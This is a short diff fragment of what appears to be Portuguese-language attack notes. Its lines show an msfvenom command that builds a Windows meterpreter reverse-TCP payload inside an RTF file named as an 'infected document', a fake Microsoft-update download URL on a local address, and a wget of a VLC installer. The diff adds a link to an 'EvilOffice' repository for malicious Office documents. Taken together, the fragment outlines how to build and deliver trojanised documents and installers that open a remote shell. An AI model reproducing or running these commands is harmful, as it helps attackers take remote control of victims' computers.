@@ -21,6 +21,8 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu_ip> LPORT=<porta> -f rtf -o documento_infectado.rtf
 
+https://github.com/infosecn1nja/EvilOffice
+
 
 wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup.exe
 
